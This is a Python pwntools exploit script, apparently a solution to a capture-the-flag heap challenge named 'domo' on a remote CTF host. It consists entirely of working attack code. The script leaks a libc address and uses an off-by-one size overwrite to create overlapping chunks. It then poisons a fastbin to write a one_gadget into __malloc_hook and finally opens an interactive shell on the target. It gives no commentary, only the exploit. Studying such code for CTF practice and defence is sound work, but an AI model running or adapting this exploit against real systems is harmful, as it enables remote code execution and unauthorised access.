import sys
from pwn import *
from ctypes import *
from pwn_debug.pwn_debug import *
binary='domo'
elf=ELF(binary)
pdbg=pwn_debug(binary)
pdbg.local("libc.so.6")
pdbg.debug("2.23")
pdbg.remote('node3.buuoj.cn',26132)
pdbg.context.log_level='debug'
while True :
	# try :
		if len(sys.argv)==1 :
			#io=pdbg.run("debug")
			io=pdbg.run("local")
			libc=pdbg.libc
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
			# one_gadgaet=[0x41602,0x41656,0xdef36]
		else :
			io=pdbg.run("remote")
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			# libc=ELF('../../x64libc/libc.so.6')
			# one_gadgaet=[0x4f2c5,0x4f322,0x10a38c]
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]


		def add(a,c):
			io.sendlineafter('> ','1')
			io.sendlineafter('size:',str(a))
			io.sendafter('content:',c)

		def delete(a):
			io.sendlineafter('> ','2')
			io.sendlineafter('index:\n',str(a))

		def edit(a,c):
			io.sendlineafter('> ','4')
			io.sendlineafter('addr:',str(a))
			io.sendafter('num:',c)

		def show(a):
			io.sendlineafter('> ','3')
			io.sendlineafter('index:\n',str(a))
		
		add(0x80,'aa')
		add(0x60,'aa')
		add(0xf0,'aa')
		add(0x60,'aa')
		delete(0)
		add(0x7a,'a')
		show(0)

		libc_base=u64(io.recvuntil('\x7f')[-6:]+'\x00\x00')-libc.sym['__malloc_hook']-0x51
		libc.address=libc_base
		system_addr=libc.sym['system']
		bin_sh_addr=libc.search('/bin/sh\x00').next()


		delete(0)
		delete(1)
		add(0x68,'\x00'*0x60+p64(0x100)[:2])
		delete(2)
		delete(0)
		add(0xc0,'\x00'*0x88+p64(0x71)+p64(libc.sym['__malloc_hook']-0x23))
		add(0x60,'a')
		add(0x60,'\x00'*0xb+p64(one_gadgaet[2]+libc_base)+p64(libc.sym['realloc']+13))
		io.sendline('2'*0x100)


		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue